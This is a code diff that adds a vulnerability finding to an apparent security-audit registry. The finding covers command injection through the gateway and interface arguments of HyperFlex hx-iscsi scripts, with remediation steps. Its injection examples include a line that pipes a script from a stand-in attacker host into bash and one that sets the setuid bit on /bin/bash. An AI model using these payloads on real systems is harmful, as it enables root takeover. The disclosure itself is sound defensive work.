@@ -8134,10 +8134,87 @@ HX_F139 = {
     ),
 }
 
+HX_F140 = {
+    "id": "HX-F140",
+    "title": (
+        "HyperFlex HXDP 6.0.2b hx-iscsi — OS Command Injection via Unsanitized --gateway/--interface "
+        "Arguments in shell=True subprocess Calls Achieves Root Code Execution on ctlVM"
+    ),
+    "severity": "HIGH",
+    "cvss": "8.8",
+    "cvss_vector": "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
+    "cwe": "CWE-78",
+    "versions_affected": "6.0.2b (confirmed); all versions shipping hx-iscsi with affected scripts",
+    "component": "hx-iscsi package (configureNetworking.py + storageClientNetworkConfigure.py)",
+    "description": (
+        "Two Python scripts in the hx-iscsi package pass unsanitized command-line arguments "
+        "directly into shell=True subprocess calls, allowing OS command injection when "
+        "network configuration parameters are attacker-influenced.\n\n"
+        "Affected file 1: /opt/hyperflex/hx-iscsi/configureNetworking.py\n"
+        "  Line 321 (command construction):\n"
+        "    command = \"fping -I %s %s\" %(NetworkSetup.INTERFACE, NetworkSetup.GATEWAY)\n"
+        "  Line 177 (execution):\n"
+        "    status = subprocess.call(command, shell=True)\n"
+        "  INTERFACE and GATEWAY are set directly from --interface and --gateway cmdline args\n"
+        "  (parse_cmdline_args(), lines 123-130) with no sanitization, validation, or escaping.\n\n"
+        "Affected file 2: /opt/hyperflex/hx-iscsi/storageClientNetworkConfigure.py\n"
+        "  Line 220 (command construction):\n"
+        "    command = \"fping -I eth-iscsi1 %s\" %(NetworkSetup.GATEWAY)\n"
+        "  Line 142 (execution):\n"
+        "    status = subprocess.call(command, shell=True)\n"
+        "  GATEWAY is set from the --gateway cmdline arg with no sanitization.\n"
+        "  The same GATEWAY value is written verbatim to the interface config file:\n"
+        "    content = content + 'gateway ' + NetworkSetup.GATEWAY + '\\n'  (line 181)\n\n"
+        "Both scripts execute as root (they modify /etc/netplan/, /etc/iproute2/rt_tables, "
+        "call 'netplan apply', and restart iscsisvc.service).\n\n"
+        "Attack chain: a stDeploy Thrift client with cluster-admin privilege calls a network "
+        "reconfiguration method; stDeploy passes the supplied iSCSI gateway/interface values "
+        "to these scripts via ansible extra-vars; the scripts execute the injected payload "
+        "as root on the ctlVM. During the upgrade migration path (configure-networks.yml), "
+        "gateway values previously written to /tmp-config/etc/network/eth-iscsi1.interface "
+        "are read back and passed to configureNetworking.py without sanitization, creating "
+        "a second injection surface through persisted configuration.\n\n"
+        "Injection examples:\n"
+        "  --gateway '10.0.0.1; curl http://attacker/shell.sh | bash'\n"
+        "  --interface 'eth0 $(id>/tmp/pwned)'\n"
+        "  --gateway '$(chmod u+s /bin/bash)'",
+    ),
+    "proof_of_concept": (
+        "# Payload delivery via --gateway argument\n"
+        "# configureNetworking.py line 321:\n"
+        "#   command = \"fping -I eth-iscsi1 %s\" % GATEWAY\n"
+        "#   subprocess.call(command, shell=True)  # shell expands ; and $(...)\n\n"
+        "# Injection:\n"
+        "GATEWAY = '10.0.0.1; id > /tmp/pwned'\n"
+        "command = 'fping -I eth-iscsi1 ' + GATEWAY\n"
+        "# Executed shell string: 'fping -I eth-iscsi1 10.0.0.1; id > /tmp/pwned'\n"
+        "# fping exits, then id runs as root\n\n"
+        "# Interface injection (configureNetworking.py only):\n"
+        "INTERFACE = 'eth-iscsi1 $(touch /tmp/injected)'\n"
+        "command = 'fping -I eth-iscsi1 $(touch /tmp/injected) 10.0.0.1'\n"
+        "# $(...) evaluated by shell at execution time"
+    ),
+    "files": [
+        "/opt/hyperflex/hx-iscsi/configureNetworking.py",
+        "/opt/hyperflex/hx-iscsi/storageClientNetworkConfigure.py",
+    ],
+    "remediation": (
+        "1. Replace subprocess.call(command, shell=True) with subprocess.call(args_list, "
+        "   shell=False) where args_list is a pre-split argument array:\n"
+        "     subprocess.call(['fping', '-I', INTERFACE, GATEWAY], shell=False)\n"
+        "2. Validate INTERFACE against an allowlist of known interface names (regex: "
+        "   ^[a-zA-Z0-9\\-]+$) before any use.\n"
+        "3. Validate GATEWAY as a well-formed IPv4 or IPv6 address using ipaddress.ip_address() "
+        "   (the module is already imported in both scripts) and reject any value that fails.\n"
+        "4. Apply the same fix to the ip route command at line 182 of storageClientNetworkConfigure.py "
+        "   which appends GATEWAY verbatim into a shell command string written to the interface file."
+    ),
+}
+
 for _f in [
     HX_F120, HX_F121, HX_F122, HX_F123, HX_F124, HX_F125, HX_F126,
     HX_F127, HX_F128, HX_F129, HX_F130, HX_F131, HX_F132, HX_F133, HX_F134,
-    HX_F135, HX_F136, HX_F137, HX_F138, HX_F139,
+    HX_F135, HX_F136, HX_F137, HX_F138, HX_F139, HX_F140,
 ]:
     FINDINGS[_f["id"]] = _f
 
